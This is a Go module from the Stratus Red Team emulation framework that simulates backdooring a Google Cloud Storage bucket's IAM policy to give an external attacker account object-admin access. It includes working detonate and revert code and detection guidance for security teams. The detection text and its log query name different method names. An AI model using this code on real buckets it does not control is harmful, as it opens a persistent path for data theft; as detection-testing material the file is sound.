package gcp

import (
    "context"
    _ "embed"
    "fmt"
    "log"
    "time"
    "cloud.google.com/go/storage"
    "cloud.google.com/go/iam/apiv1/iampb"
    utils "github.com/datadog/stratus-red-team/v2/internal/utils"
    gcp_utils "github.com/datadog/stratus-red-team/v2/internal/utils/gcp"
    "github.com/datadog/stratus-red-team/v2/pkg/stratus"
    "github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

const RoleToGrant = "roles/storage.objectAdmin"

func init() {
    const CodeBlock = "```"
    const AttackTechniqueId = "gcp.exfiltration.gcs-backdoor-bucket-policy"

    stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
        ID:           AttackTechniqueId,
        FriendlyName: "Backdoor a Cloud Storage bucket via its bucket policy",
        Description: `
Exfiltrates data from a Cloud Storage bucket by backdooring its policy to allow access from an external, fictitious GCP account.

Warm-up:

- Create a Cloud Storage bucket

Detonation:

- Backdoor the IAM policy of the bucket to grant the role <code>` + RoleToGrant + `</code> to a fictitious attacker

!!! info

    Since the target e-mail must exist for this attack simulation to work, Stratus Red Team grants the role to ` + gcp_utils.DefaultFictitiousAttackerEmail + ` by default.
    This is a real Google account, owned by Stratus Red Team maintainers and that is not used for any other purpose than this attack simulation. However, you can override
    this behavior by setting the environment variable <code>` + utils.AttackerEmailEnvVarKey + `</code>, for instance:

` + CodeBlock + `bash
    export ` + utils.AttackerEmailEnvVarKey + `="your-own-gmail-account@gmail.com"
    stratus detonate ` + AttackTechniqueId + `
` + CodeBlock + `
`,
        Detection: `
Granting IAM role to account is detected as 'storage.setIamPolicy' in Cloud Logging.

Data Access logging for GCS bucket is disabled by default, thus we need to enable it (if not enabled).

- Go to "IAM & Admin" -> "Audit Logs"
- Locate "Google Cloud Storage"
- on "Permission Types", check the "Admin read"

You can use following query to filter the events:

` + CodeBlock + `
resource.type="gcs_bucket"
protoPayload.serviceName="storage.googleapis.com"
protoPayload.methodName="storage.setIamPermissions"
` + CodeBlock + `

Sample event (shortened for readability):

` + CodeBlock + `json
{
  "logName": "projects/my-project-id/logs/cloudaudit.googleapis.com%2Factivity",
  "protoPayload": {
    "authenticationInfo": {
      "principalEmail": "username@service.com",
    },
    "methodName": "storage.setIamPermissions",
    "resourceName": "projects/_/buckets/my-bucket-id",
    "serviceName": "storage.googleapis.com",
  },
  "resource": {
    "type": "gcs_bucket"
  },
  "severity": "NOTICE"
}
` + CodeBlock + `
`,
        Platform:                   stratus.GCP,
        IsIdempotent:               true,
        MitreAttackTactics:         []mitreattack.Tactic{ mitreattack.Exfiltration },
        PrerequisitesTerraformCode: tf,
        Detonate:                   detonate,
        Revert:                     revert,
    })
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
    ctx := context.Background()

    principal := gcp_utils.GetAttackerPrincipal()
    bucketName := params["bucket_name"]

    // create storage client for API communication
    client, err := storage.NewClient(ctx)
    if err != nil {
        return fmt.Errorf("Failed to create storage client: %v", err)
    }
    defer client.Close()

    // set timeout for operation
    ctx, cancel := context.WithTimeout(ctx, 10*time.Second)
    defer cancel()

    // get the bucket policy
    policy, err := client.Bucket(bucketName).IAM().V3().Policy(ctx)
    if err != nil {
        return fmt.Errorf("Failed to get bucket policy: %v", err)
    }

    // grant the role to backdoor user (if not already granted)
    var found bool 
    for _, pbi := range policy.Bindings {
        // role is found, check whether we had been granted
        if pbi.Role == RoleToGrant {
            for _, member := range pbi.Members {
                if member == principal {
                    found = true 
                    break 
                }
            }

            pbi.Members = append(pbi.Members, principal)
            found = true 
            break
        }
    }

    if !found {
        policy.Bindings = append(policy.Bindings, &iampb.Binding{
            Role:    RoleToGrant,
            Members: []string{principal},
        })
    }

    // apply the policy even if we had been granted already, so we can generate log
    if err := client.Bucket(bucketName).IAM().V3().SetPolicy(ctx, policy); err != nil {
        return fmt.Errorf("Failed to set bucket policy: %v", err)
    }
    
    log.Printf("Attacker '%s' is granted the ownership of the bucket\n", principal)
    
    return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
    ctx := context.Background()

    principal := gcp_utils.GetAttackerPrincipal()
    bucketName := params["bucket_name"]

    // create storage client for API communication
    client, err := storage.NewClient(ctx)
    if err != nil {
        return fmt.Errorf("Failed to create storage client: %v", err)
    }
    defer client.Close()

    // set timeout for operation
    ctx, cancel := context.WithTimeout(ctx, 10*time.Second)
    defer cancel()

    // get the bucket policy
    policy, err := client.Bucket(bucketName).IAM().V3().Policy(ctx)
    if err != nil {
        return fmt.Errorf("Failed to get bucket policy: %v", err)
    }

    var bindings []*iampb.Binding
    for _, binding := range policy.Bindings {
        if binding.Role == RoleToGrant {
            // create new members list without the principal
            var members []string
            for _, member := range binding.Members {
                if member != principal {
                    members = append(members, member)
                }
            }

            if len(members) > 0 {
                binding.Members = members 
                bindings = append(bindings, binding)
            }
        } else {
            bindings = append(bindings, binding)
        }
    }
    policy.Bindings = bindings

    // apply the policy
    if err := client.Bucket(bucketName).IAM().V3().SetPolicy(ctx, policy); err != nil {
        return fmt.Errorf("unable to set bucket policy: %v\n", err)
    }

    log.Printf("Attacker '%s' is denied the ownership of the bucket\n", principal)
    return nil
}